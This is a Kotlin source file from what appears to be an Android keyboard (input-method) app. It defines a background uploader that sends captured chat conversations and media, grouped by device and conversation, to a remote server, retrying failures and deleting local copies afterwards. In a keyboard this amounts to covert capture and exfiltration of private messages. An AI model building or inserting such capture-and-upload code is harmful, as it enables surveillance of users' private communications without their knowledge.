package com.yuyan.imemodule.data.capture.net

import android.content.Context
import com.yuyan.imemodule.data.capture.db.CaptureDao
import com.yuyan.imemodule.data.capture.db.CaptureDatabase
import com.yuyan.imemodule.data.capture.db.PendingAssetEntity
import com.yuyan.imemodule.data.capture.db.PendingMessageEntity
import com.yuyan.imemodule.data.collect.ServerConfig
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.channels.Channel
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import kotlinx.coroutines.withTimeoutOrNull
import kotlinx.serialization.decodeFromString
import kotlinx.serialization.json.Json
import java.io.File
import java.util.concurrent.atomic.AtomicLong

fun retryDelayMillis(attempts: Int): Long = when (attempts.coerceAtLeast(1)) {
    1 -> 30_000L
    2 -> 120_000L
    3 -> 600_000L
    else -> 1_800_000L
}

data class UploadRunResult(
    val processed: Int,
    val failures: Int,
)

class CaptureUploader(
    private val dao: CaptureDao,
    private val api: CaptureApi,
    private val assetFile: (sha256: String) -> File,
) {
    val internalFailureCount = AtomicLong(0)

    suspend fun runOnce(now: Long = System.currentTimeMillis()): UploadRunResult {
        var processed = 0
        var failures = 0

        for (asset in dao.dueAssets(now, MAX_ASSET_BATCH)) {
            processed += 1
            val uploaded = try {
                api.uploadAsset(asset)
            } catch (_: Exception) {
                false
            }
            if (uploaded) {
                dao.deletePendingAsset(asset.sha256)
            } else {
                failures += 1
                markAssetFailed(asset, now)
            }
        }

        val decoded = mutableListOf<Pair<PendingMessageEntity, PendingMessageUploadPayload>>()
        for (message in dao.readyMessages(now, MAX_MESSAGE_BATCH)) {
            try {
                decoded += message to api.decodeMessagePayload(message.payloadJson)
            } catch (_: Exception) {
                processed += 1
                failures += 1
                markMessageFailed(message, now)
            }
        }

        val groups = decoded.groupBy { (_, payload) ->
            payload.deviceId to payload.conversation.toString()
        }
        for (group in groups.values) {
            processed += group.size
            val uploaded = try {
                api.uploadMessages(group.map { it.second })
            } catch (_: Exception) {
                false
            }
            if (uploaded) {
                val messages = group.map { it.first }
                dao.confirmMessagesUploaded(messages.map { it.id })
                messages.asSequence()
                    .flatMap { requiredAssets(it).asSequence() }
                    .distinct()
                    .forEach { hash -> assetFile(hash).delete() }
            } else {
                failures += group.size
                group.forEach { (message) -> markMessageFailed(message, now) }
            }
        }

        if (failures > 0) internalFailureCount.addAndGet(failures.toLong())
        return UploadRunResult(processed = processed, failures = failures)
    }

    private suspend fun markAssetFailed(asset: PendingAssetEntity, now: Long) {
        val attempts = asset.attempts + 1
        dao.updateAssetRetry(asset.sha256, attempts, now + retryDelayMillis(attempts))
    }

    private suspend fun markMessageFailed(message: PendingMessageEntity, now: Long) {
        val attempts = message.attempts + 1
        dao.updateMessageRetry(message.id, attempts, now + retryDelayMillis(attempts))
    }

    private fun requiredAssets(message: PendingMessageEntity): List<String> = try {
        Json.decodeFromString(message.requiredAssetHashesJson)
    } catch (_: Exception) {
        emptyList()
    }

    companion object {
        private const val MAX_ASSET_BATCH = 200
        private const val MAX_MESSAGE_BATCH = 200
        private const val IDLE_DELAY_MILLIS = 30_000L
        private const val ACTIVE_DELAY_MILLIS = 1_000L
        private val startLock = Any()
        private var uploadJob: Job? = null
        private val wakeSignal = Channel<Unit>(Channel.CONFLATED)

        fun wake() {
            wakeSignal.trySend(Unit)
        }

        fun start(context: Context) {
            val appContext = context.applicationContext
            synchronized(startLock) {
                if (uploadJob?.isActive == true) return
                ServerConfig.init(appContext)
                val database = CaptureDatabase.create(appContext)
                val uploader = CaptureUploader(
                    dao = database.captureDao(),
                    api = CaptureApi(ServerConfig.baseUrl),
                    assetFile = { hash -> File(appContext.cacheDir, "chat-capture/$hash") },
                )
                uploadJob = CoroutineScope(SupervisorJob() + Dispatchers.IO).launch {
                    while (isActive) {
                        val result = try {
                            uploader.runOnce()
                        } catch (_: Exception) {
                            uploader.internalFailureCount.incrementAndGet()
                            UploadRunResult(processed = 0, failures = 1)
                        }
                        val waitMillis = if (result.processed > 0) ACTIVE_DELAY_MILLIS else IDLE_DELAY_MILLIS
                        withTimeoutOrNull(waitMillis) { wakeSignal.receive() }
                    }
                }
            }
        }
    }
}
